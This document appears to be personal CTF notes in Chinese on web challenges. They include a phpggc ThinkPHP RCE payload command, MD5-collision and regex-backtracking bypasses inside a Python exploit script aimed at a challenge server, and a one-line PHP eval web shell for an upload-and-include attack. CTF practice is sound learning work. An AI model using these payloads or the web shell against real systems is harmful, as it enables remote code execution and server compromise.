# Oyst3rPHP
	- 用phpggc生成一个payload，注意需要base64编码
		- ```shell
		  ./phpggc ThinkPHP/RCE4 system 'cat /*'
		  ```
	- 然后用 ((65d1dc32-93ea-4f09-baf9-fb484b8a10f6)) 绕md5
	- 最后绕preg_match, 用[[CTFWEB/PHP/正则匹配回溯次数绕过]]
	- ```python
	  url = "http://yuanshen.life:38725/"
	  
	  payload = encoder.base64_decode("这里是phpggc的payload")
	  a = b"\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2"
	  b = b"\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2"
	  
	  r = base_post(url, params = {
	      "left": a,
	      "right": b
	  }, data = {
	      "key": 'a' * 1000100 + "603THINKPHP",
	      "payload": encoder.base64_encode(payload)
	  })
	  print(r.text)
	  ```
- # 100％_upload
	- 把这个文件传上去然后include即可
		- ```shell
		  echo '123<?=eval($_GET[1])?>' > a.txt
		  ```
-
- # 没做
	- EZ_SSRF: 一眼php fpm ssrf
		- 然而官方WP是访问`admin.php`(
	- Not just unserialize: 打这个[[CTFWEB/从env到RCE]]
	-